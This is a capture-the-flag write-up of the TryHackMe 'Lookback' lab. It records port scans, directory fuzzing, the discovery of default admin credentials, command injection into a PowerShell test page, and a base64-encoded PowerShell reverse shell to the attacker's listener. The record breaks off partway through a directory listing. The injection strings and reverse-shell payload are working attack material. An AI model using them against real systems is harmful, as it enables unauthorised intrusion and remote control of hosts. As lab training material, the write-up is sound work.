# Lookback — Writeup

## Overview
### Lookback — Writeup
### Lookback — Writeup
----
You’ve been asked to run a vulnerability test on a production environment.
---
![](https://tryhackme-images.s3.amazonaws.com/room-icons/d8877bf37d4015f1b78d243078dece09.png)

## Flags / Answers
- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/6cb23ff9b40ce86c6b61c485e66621bb.png)
- Start Machine
- The Lookback company has just started the integration with Active Directory. Due to the coming deadline, the system integrator had to rush the deployment of the environment. Can you spot any vulnerabilities?
- Start the Virtual Machine by pressing the Start Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection. This machine does not respond to ping (ICMP).
- Can you find all the flags?
- The VM takes about 5/10 minutes to fully boot up.
- _Sometimes to move forward, we have to go backward._
- _So if you get stuck, try to look back!_
- Answer the questions below
```text
- ┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.61.189 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.61.189:80
Open 10.10.61.189:443
Open 10.10.61.189:3389
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.61.189 [3 ports]
Discovered open port 80/tcp on 10.10.61.189
Discovered open port 443/tcp on 10.10.61.189
Discovered open port 3389/tcp on 10.10.61.189
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on 10.10.61.189
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.61.189.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.61.189
Host is up, received user-set (0.38s latency).

PORT     STATE SERVICE       REASON  VERSION
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
443/tcp  open  ssl/https     syn-ack
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Outlook
|_Requested resource was https://10.10.61.189/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.61.189%2fowa%2f&reason=0
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Issuer: commonName=WIN-12OUO7A66M7
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| MD5:   84e0805f3667c38fd8204e7c1da04215
| SHA-1: 08458fd9d9bfc4c648db1f82d3e7324ea92452d7
| -----BEGIN CERTIFICATE-----
| MIIDKjCCAhKgAwIBAgIQTm2IqMBJs7RKv49wp456pzANBgkqhkiG9w0BAQUFADAa
| MRgwFgYDVQQDEw9XSU4tMTJPVU83QTY2TTcwHhcNMjMwMTI1MjEzNDAyWhcNMjgw
| MTI1MjEzNDAyWjAaMRgwFgYDVQQDEw9XSU4tMTJPVU83QTY2TTcwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDS7xdfJC7zHZQtxk7LNxq1DQaaapFZsRId
| 66AbvRCYdvTISToxEDYEprkrIU0YIbB9DzvOYQ23X3F3Y7ylUXRsd0yq3lVX86gD
| KtWAChKB9ph0VERYqOXoM5Aaej15todacRmqVgX8lbkK37qVPLz9g7n8VfgrJii9
| zl1Mm8i17s1KERY9aIyxrYecU1dBCX+R4foMHETB7i0yTtG0H+6MAykoTJSJcX+C
| Mx5QTASgGQXpgRSzUy5SSkJlLasyZ+WVnji6ShZWC3/dHUED0cO+AFna2NFQIASa
| fWGXXGnhaCLXctm9dDUnq2eg/+AfkJQNbn5eKIGsBYXDG7tfAqFNAgMBAAGjbDBq
| MA4GA1UdDwEB/wQEAwIFoDA1BgNVHREELjAsgg9XSU4tMTJPVU83QTY2TTeCGVdJ
| Ti0xMk9VTzdBNjZNNy50aG0ubG9jYWwwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDAYD
| VR0TAQH/BAIwADANBgkqhkiG9w0BAQUFAAOCAQEAPV5SA6om07FjNj3mlpTBJMxI
| 8aOECGirP6f7w5pFqYZ/8TP3ZL2o9Iy2ZzgipcvO0t71IAxHswFv2NN551wNkfie
| ZlcZSzsep/ym+EVRADLeyuDTt5T3aRq4n6EO4DQN0iyczisChAieFFi7FNXJerft
| uAQlqIrqvmpvMlMoin/TLv1Wg4QRXvUk5J4gI8q0DNQt7/bk8DUaHrumq7AP5jym
| wUf2+fSq4nPyB/kW39ftUKiJU/bzmEf4gMozeXTQhzkpFRTgSO+9sRTmiTsk6UMz
| l3WZLZr4/d/H5dnN0b/3k7CcuoFlmZjSKhnIcPQfXBEUIf5dE7pS7BaqVMooYQ==
|_-----END CERTIFICATE-----
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Issuer: commonName=WIN-12OUO7A66M7.thm.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| MD5:   dce9a0190d34ca2401bdb21574409c9d
| SHA-1: d55a03f1992df334805947f990eb25be4092cbf0
| -----BEGIN CERTIFICATE-----
| MIIC9jCCAd6gAwIBAgIQVVEvN1hoxopPxcxgdQbcKzANBgkqhkiG9w0BAQsFADAk
| MSIwIAYDVQQDExlXSU4tMTJPVU83QTY2TTcudGhtLmxvY2FsMB4XDTIzMDEyNTIx
| MTI1MVoXDTIzMDcyNzIxMTI1MVowJDEiMCAGA1UEAxMZV0lOLTEyT1VPN0E2Nk03
| LnRobS5sb2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCg6Tls
| nrbpOjmP7oy5Ncw+r/Q+Pab6Q4GaHQBCE+gD5XGim9S71LVrxf942NzVSL1ebc3k
| cC+AweAlzaS8AphN+ZbULdLN0hEamafEV0y3ZsYrQBPdqHXg9c4wk7TubmbzU6zY
| fABPXkXQE4nNlJPnlOsaiTCXhuPFLxKLABZ1DLWmFFBLZMC1j88Rb4Pc/BBENYY3
| 8nJIGJi9F44Eq/BDTUiIXCpc6tRkaWclPPB3qVHGOufSkisaWIPYhTIcrHYSHpYO
| MrWqYeJGMuvOdfzXThupfyB9E2ESRM/VZvRzU9cy63Fa5W0fcI4FPmb3SRfQLcHz
| NV5qqMePSSO8FT0CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0P
| BAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQAYMi75E8iMGYhCufi02kwo7Q4Q4iSj
| x/Qkme3u+mji8LCeKP7ustS0piVYRZmQlu7IYgeQSHJLqdOquh1cUOpFq+Dc0XX6
| g+wnhCT1qrl+VQz4MfXBh0KwLLWPvLWHJIno+ZKSVgnD/Thsn3UR3AHjG/mr43PS
| PEV1TXqyDyeG3Z0l/z7qfqHXxttdoxVB5VHl2tg0dCf8llmrmhYjEpAi/KC3Hlra
| kxjulcfLKTaUSRytiv//q+WSQIhNvMCGI2UxWiXcLAcv+aIHsUdIGCPrzhnIVCOA
| YCAqzbCtd181CJrW9mlBaiUX6H5yONtSxdZLFFmOsY/rnqOJarElTpQT
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-04-07T16:03:21+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.20 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts 
10.10.61.189 WIN-12OUO7A66M7.thm.local

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u 10.10.61.189 -i200,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/10.10.61.189_23-04-07_12-15-52.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-04-07_12-15-52.log

Target: http://10.10.61.189/

[12:15:53] Starting: 
[12:16:48] 401 -    0B  - /rpc

Task Completed

┌──(witty㉿kali)-[~/Downloads]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://win-12ouo7a66m7.thm.local/FUZZ" -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://win-12ouo7a66m7.thm.local/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

[Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 196ms]
    * FUZZ: test

need a user and a pass

 <h2>403 - Forbidden: Access is denied.</h2>

  <h3>You do not have permission to view this directory or page using the credentials that you supplied.

┌──(witty㉿kali)-[~/Downloads]
└─$ nikto -host 10.10.61.189                               
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.61.189
+ Target Hostname:    10.10.61.189
+ Target Port:        80
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ All CGI directories 'found', use '-C none' to test none
+ /Autodiscover/Autodiscover.xml: Retrieved x-powered-by header: ASP.NET.
+ /Autodiscover/Autodiscover.xml: Uncommon header 'x-feserver' found, with contents: WIN-12OUO7A66M7.
+ /Rpc: Uncommon header 'request-id' found, with contents: 1c211d8b-c4ea-4c34-8646-1a277c9a6677.
+ /Rpc: Default account found for '' at (ID 'admin', PW 'admin'). Generic account discovered.. See: CWE-16

default creds

https://10.10.61.189/test/

This interface should be removed on production!

THM{Security_Through_Obscurity_Is_Not_A_Defense}

Get-Content : Cannot find path 'C:\test' because it does not exist.
At line:1 char:1
+ Get-Content('C:\test')
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\test:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand

')&whoami

At line:1 char:19
+ Get-Content('C:\')&whoami')
+                   ~
The ampersand (&) character is not allowed. The & operator is reserved for future use; wrap an ampersand in double 
quotation marks ("&") to pass it as part of a string.
At line:1 char:26
+ Get-Content('C:\')&whoami')

')&whoami('

+ Get-Content('C:\')&whoami('')
+                   ~
The ampersand (&) character is not allowed. The & operator is reserved for future use; wrap an ampersand in double 
quotation marks ("&") to pass it as part of a string.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : AmpersandNotAllowed

');whoami('

Get-Content : Access to the path 'C:\' is denied.
At line:1 char:1
+ Get-Content('C:\');whoami('')
+ ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
 
thm\admin

')|whoami('

thm\admin

or just ')| whatever; & whoami('

');dir('

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2023   1:35 PM                backup                                                                
d-----        1/25/2023  12:12 PM                Config                                                                
d-----        1/25/2023  12:12 PM                en                                                                    
d-----        1/25/2023   1:04 PM                en-US                                                                 
d-----         4/7/2023   8:57 AM                History                                                               
d-----        1/25/2023  12:44 PM                MetaBack                                                              
-a----        1/25/2023  12:44 PM         252928 abocomp.dll                                                           
-a----        1/25/2023  12:44 PM         324608 adsiis.dll                                                            
-a----        1/25/2023  12:12 PM         119808 appcmd.exe                                                            
-a----        9/15/2018  12:14 AM           3810 appcmd.xml                                                            
-a----        1/25/2023  12:12 PM         181760 AppHostNavigators.dll                                                 
-a----        1/25/2023  12:11 PM          80896 apphostsvc.dll                                                        
-a----        1/25/2023  12:12 PM         406016 appobj.dll                                                            
-a----        1/25/2023  12:15 PM         504320 asp.dll                                                               
-a----        1/25/2023  12:15 PM          22196 asp.mof                                                               
-a----        1/25/2023  12:11 PM         131072 aspnetca.exe                                                          
-a----        1/25/2023  12:15 PM          23040 asptlb.tlb                                                            
-a----        1/25/2023  12:12 PM          40448 authanon.dll                                                          
-a----        1/25/2023  12:15 PM          38400 authbas.dll                                                           
-a----        1/25/2023  12:15 PM          27136 authcert.dll                                                          
-a----        1/25/2023  12:15 PM          44544 authmap.dll                                                           
-a----        1/25/2023  12:15 PM          40960 authmd5.dll                                                           
-a----        1/25/2023  12:15 PM          52736 authsspi.dll                                                          
-a----        1/25/2023  12:15 PM          74240 browscap.dll                                                          
-a----        1/25/2023  12:15 PM          34474 browscap.ini                                                          
-a----        1/25/2023  12:11 PM          24064 cachfile.dll                                                          
-a----        1/25/2023  12:11 PM          52224 cachhttp.dll                                                          
-a----        1/25/2023  12:11 PM          15872 cachtokn.dll                                                          
-a----        1/25/2023  12:11 PM          14336 cachuri.dll                                                           
-a----        1/25/2023  12:15 PM          43520 cgi.dll                                                               
-a----        1/25/2023  12:54 PM          99328 Cnfgprts.ocx                                                          
-a----        1/25/2023  12:44 PM          86528 coadmin.dll                                                           
-a----        1/25/2023  12:15 PM          43008 compdyn.dll                                                           
-a----        1/25/2023  12:11 PM          54784 compstat.dll                                                          
-a----        1/25/2023  12:12 PM          47104 custerr.dll                                                           
-a----        1/25/2023  12:11 PM          20480 defdoc.dll                                                            
-a----        1/25/2023  12:15 PM          38912 diprestr.dll                                                          
-a----        1/25/2023  12:11 PM          24064 dirlist.dll                                                           
-a----        1/25/2023  12:15 PM          68096 filter.dll                                                            
-a----        1/25/2023  12:12 PM          38400 gzip.dll                                                              
-a----        1/25/2023  12:11 PM          22016 httpmib.dll                                                           
-a----        1/25/2023  12:11 PM          18432 hwebcore.dll                                                          
-a----        1/25/2023  12:12 PM          63105 iis.msc                                                               
-a----        1/25/2023  12:54 PM          48997 iis6.msc                                                              
-a----        1/25/2023  12:44 PM          26112 iisadmin.dll                                                          
-a----        1/25/2023  12:44 PM        1016832 iiscfg.dll                                                            
-a----        1/25/2023  12:11 PM         307200 iiscore.dll                                                           
-a----        1/25/2023  12:15 PM         132608 iisetw.dll                                                            
-a----        1/25/2023  12:44 PM         104448 iisext.dll                                                            
-a----        1/25/2023  12:15 PM          86016 iisfcgi.dll                                                           
-a----        1/25/2023  12:15 PM         168448 iisfreb.dll                                                           
-a----        1/25/2023  12:15 PM          88576 iislog.dll                                                            
-a----        1/25/2023  12:11 PM         110080 iisreg.dll                                                            
-a----        1/25/2023  12:15 PM          18432 iisreqs.dll                                                           
-a----        1/25/2023  12:12 PM         231936 iisres.dll                                                            
-a----        1/25/2023  12:11 PM          37888 iisrstas.exe                                                          
-a----        1/25/2023  12:12 PM         192512 iissetup.exe                                                          
-a----        1/25/2023  12:12 PM          57344 iissyspr.dll                                                          
-a----        1/25/2023  12:11 PM          14848 iisual.exe                                                            
-a----        1/25/2023  12:54 PM         262656 iisui.dll                                                             
-a----        1/25/2023  12:54 PM          81408 IISUiObj.dll                                                          
-a----        1/25/2023  12:12 PM         284672 iisutil.dll                                                           
-a----        1/25/2023  12:12 PM         612864 iisw3adm.dll                                                          
-a----        1/25/2023  12:54 PM         260608 iiswmi.dll                                                            
-a----        1/25/2023  12:15 PM          33792 iis_ssi.dll                                                           
-a----        1/25/2023  12:44 PM          16896 inetinfo.exe                                                          
-a----        1/25/2023  12:54 PM         932352 inetmgr.dll                                                           
-a----        1/25/2023  12:12 PM         125440 InetMgr.exe                                                           
-a----        1/25/2023  12:54 PM          25088 InetMgr6.exe                                                          
-a----        1/25/2023  12:44 PM         256000 infocomm.dll                                                          
-a----        1/25/2023  12:15 PM          30208 iprestr.dll                                                           
-a----        1/25/2023  12:15 PM         131584 isapi.dll                                                             
-a----        1/25/2023  12:44 PM          67072 isatq.dll                                                             
-a----        1/25/2023  12:44 PM          25600 iscomlog.dll                                                          
-a----        1/25/2023  12:15 PM          24064 logcust.dll                                                           
-a----        1/25/2023  12:12 PM          36352 loghttp.dll                                                           
-a----        1/25/2023  12:54 PM          39424 logscrpt.dll                                                          
-a----        1/25/2023  12:15 PM            330 logtemp.sql                                                           
-a----        1/25/2023  12:54 PM          88064 logui.ocx                                                             
-a----        1/25/2023  12:44 PM         685464 MBSchema.bin.00000000h                                                
-a----        1/25/2023  12:44 PM         266906 MBSchema.xml                                                          
-a----         4/7/2023   8:57 AM          10152 MetaBase.xml                                                          
-a----        1/25/2023  12:44 PM         334848 metadata.dll                                                          
-a----        1/25/2023  12:11 PM         147456 Microsoft.Web.Administration.dll                                      
-a----        1/25/2023  12:12 PM        1052672 Microsoft.Web.Management.dll                                          
-a----        1/25/2023  12:11 PM          44032 modrqflt.dll                                                          
-a----        1/25/2023  12:12 PM         478720 nativerd.dll                                                          
-a----        1/25/2023  12:12 PM          27136 protsup.dll                                                           
-a----        1/25/2023  12:15 PM          21504 redirect.dll                                                          
-a----        1/25/2023  12:44 PM          10752 rpcref.dll                                                            
-a----        1/25/2023  12:12 PM          33792 rsca.dll                                                              
-a----        1/25/2023  12:12 PM          51200 rscaext.dll                                                           
-a----        1/25/2023  12:11 PM          40448 static.dll                                                            
-a----        1/25/2023  12:54 PM          18944 svcext.dll                                                            
-a----        1/25/2023  12:11 PM         189952 uihelper.dll                                                          
-a----        1/25/2023  12:15 PM          23552 urlauthz.dll                                                          
-a----        1/25/2023  12:54 PM          21504 validcfg.dll                                                          
-a----        1/25/2023  12:15 PM         146250 w3core.mof                                                            
-a----        1/25/2023  12:12 PM          16384 w3ctrlps.dll                                                          
-a----        1/25/2023  12:11 PM          29696 w3ctrs.dll                                                            
-a----        1/25/2023  12:11 PM         109568 w3dt.dll                                                              
-a----        1/25/2023  12:15 PM           2560 w3isapi.mof                                                           
-a----        1/25/2023  12:12 PM         101888 w3logsvc.dll                                                          
-a----        1/25/2023  12:12 PM          29184 w3tp.dll                                                              
-a----        1/25/2023  12:11 PM          26624 w3wp.exe                                                              
-a----        1/25/2023  12:12 PM          78336 w3wphost.dll                                                          
-a----        1/25/2023  12:44 PM          39936 wamreg.dll                                                            
-a----        1/25/2023  12:12 PM          31744 wbhstipm.dll                                                          
-a----        1/25/2023  12:12 PM          27648 wbhst_pm.dll                                                          
-a----        1/25/2023  12:15 PM         189952 webdav.dll                                                            
-a----        1/25/2023  12:15 PM          23552 webdav_simple_lock.dll                                                
-a----        1/25/2023  12:15 PM          20480 webdav_simple_prop.dll                                                
-a----        1/25/2023  12:54 PM          12288 WMSvc.exe                                                             
-a----        9/15/2018  12:13 AM            165 wmsvc.exe.config                                                      
-a----        1/25/2023  12:12 PM         169984 XPath.dll

revshell

powershell#3 base64

');powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADEAOQAuADEAMAAzACIALAAxADMAMwA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==('

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1338                                     
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.61.189] 9779
whoami
thm\admin
PS C:\windows\system32\inetsrv> dir

    Directory: C:\windows\system32\inetsrv

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2023   1:35 PM                backup                                                                
d-----        1/25/2023  12:12 PM                Config                                                                
d-----        1/25/2023  12:12 PM                en                                                                    
d-----        1/25/2023   1:04 PM                en-US                                                                 
d-----         4/7/2023   8:57 AM                History                                                               
d-----        1/25/2023  12:44 PM                MetaBack                                                              
-a----        1/25/2023  12:44 PM         252928 abocomp.dll                                                           
-a----        1/25/2023  12:44 PM         324608 adsiis.dll                                                            
-a----        1/25/2023  12:12 PM         119808 appcmd.exe                                                            
-a----        9/15/2018  12:14 AM           3810 appcmd.xml                                                            
-a----        1/25/2023  12:12 PM         181760 AppHostNavigators.dll                                                 
-a----        1/25/2023  12:11 PM          80896 apphostsvc.dll                                                        
-a----        1/25/2023  12:12 PM         406016 appobj.dll                                                            
-a----        1/25/2023  12:15 PM         504320 asp.dll                                                               
-a----        1/25/2023  12:15 PM          22196 asp.mof                                                               
-a----        1/25/2023  12:11 PM         131072 aspnetca.exe                                                          
-a----        1/25/2023  12:15 PM          23040 asptlb.tlb                                                            
-a----        1/25/2023  12:12 PM          40448 authanon.dll                                                          
-a----        1/25/2023  12:15 PM          38400 authbas.dll                                                           
-a----        1/25/2023  12:15 PM          27136 authcert.dll                                                          
-a----        1/25/2023  12:15 PM          44544 authmap.dll                                                           
-a----        1/25/2023  12:15 PM          40960 authmd5.dll                                                           
-a----        1/25/2023  12:15 PM          52736 authsspi.dll                                                          
-a----        1/25/2023  12:15 PM          74240 browscap.dll                                                          
-a----        1/25/2023  12:15 PM          34474 browscap.ini                                                          
-a----        1/25/2023  12:11 PM          24064 cachfile.dll                                                          
-a----        1/25/2023  12:11 PM          52224 cachhttp.dll                                                          
-a----        1/25/2023  12:11 PM          15872 cachtokn.dll                                                          
-a----        1/25/2023  12:11 PM          14336 cachuri.dll                                                           
-a----        1/25/2023  12:15 PM          43520 cgi.dll                                                               
-a----        1/25/2023  12:54 PM          99328 Cnfgprts.ocx                                                          
-a----        1/25/2023  12:44 PM          86528 coadmin.dll                                                           
-a----        1/25/2023  12:15 PM          43008 compdyn.dll                                                           
-a----        1/25/2023  12:11 PM          54784 compstat.dll                                                          
-a----        1/25/2023  12:12 PM          47104 custerr.dll                                                           
-a----        1/25/2023  12:11 PM          20480 defdoc.dll                                                            
-a----        1/25/2023  12:15 PM          38912 diprestr.dll                                                          
-a----        1/25/2023  12:11 PM          24064 dirlist.dll                                                           
-a----        1/25/2023  12:15 PM          68096 filter.dll                                                            
-a----        1/25/2023  12:12 PM          38400 gzip.dll                                                              
-a----        1/25/2023  12:11 PM          22016 httpmib.dll                                                           
-a----        1/25/2023  12:11 PM          18432 hwebcore.dll                                                          
-a----        1/25/2023  12:12 PM          63105 iis.msc                                                               
-a----        1/25/2023  12:54 PM          48997 iis6.msc                                                              
-a----        1/25/2023  12:44 PM          26112 iisadmin.dll                                                          
-a----        1/25/2023  12:44 PM        1016832 iiscfg.dll                                                            
-a----        1/25/2023  12:11 PM         307200 iiscore.dll                                                           
-a----        1/25/2023  12:15 PM         132608 iisetw.dll                                                            
-a----        1/25/2023  12:44 PM         104448 iisext.dll                                                            
-a----        1/25/2023  12:15 PM          86016 iisfcgi.dll                                                           
-a----        1/25/2023  12:15 PM         168448 iisfreb.dll                                                           
-a----        1/25/2023  12:15 PM          88576 iislog.dll                                                            
-a----        1/25/2023  12:11 PM         110080 iisreg.dll                                                            
-a----        1/25/2023  12:15 PM          18432 iisreqs.dll                                                           
-a----        1/25/2023  12:12 PM         231936 iisres.dll                                                            
-a----        1/25/2023  12:11 PM          37888 iisrstas.exe                                                          
-a----        1/25/2023  12:12 PM         192512 iissetup.exe                                                          
-a----        1/25/2023  12:12 PM          57344 iissyspr.dll                                                          
-a----        1/25/2023  12:11 PM          14848 iisual.exe                                                            
-a----        1/25/2023  12:54 PM         262656 iisui.dll                                                             
-a----        1/25/2023  12:54 PM          81408 IISUiObj.dll                                                          
-a----        1/25/2023  12:12 PM         284672 iisutil.dll                                                           
-a----        1/25/2023  12:12 PM         612864 iisw3adm.dll                                                          
-a----        1/25/2023  12:54 PM         260608 iiswmi.dll                                                            
-a----        1/25/2023  12:15 PM          33792 iis_ssi.dll                                                           
-a----        1/25/2023  12:44 PM          16896 inetinfo.exe                                                          
-a----        1/25/2023  12:54 PM         932352 inetmgr.dll                                                           
-a----        1/25/2023  12:12 PM         125440 InetMgr.exe                                                           
-a----        1/25/2023  12:54 PM          25088 InetMgr6.exe                                                          
-a----        1/25/2023  12:44 PM         256000 infocomm.dll                                                          
-a----        1/25/2023  12:15 PM          30208 iprestr.dll                                                           
-a----        1/25/2023  12:15 PM         131584 isapi.dll                                                             
-a----        1/25/2023  12:44 PM          67072 isatq.dll                                                             
-a----        1/25/2023  12:44 PM          25600 iscomlog.dll                                                          
-a----        1/25/2023  12:15 PM          24064 logcust.dll                                                           
-a----        1/25/2023  12:12 PM          36352 loghttp.dll                                                           
-a----        1/25/2023  12:54 PM          39424 logscrpt.dll                                                          
-a----        1/25/2023  12:15 PM            330 logtemp.sql                                                           
-a----        1/25/2023  12:54 PM          88064 logui.ocx                                                             
-a----        1/25/2023  12:44 PM         685464 MBSchema.bin.00000000h                                                
-a----        1/25/2023  12:44 PM         266906 MBSchema.xml                                                          
-a----         4/7/2023   8:57 AM          10152 MetaBase.xml                                                          
-a----        1/25/2023  12:44 PM         334848 metadata.dll                                                          
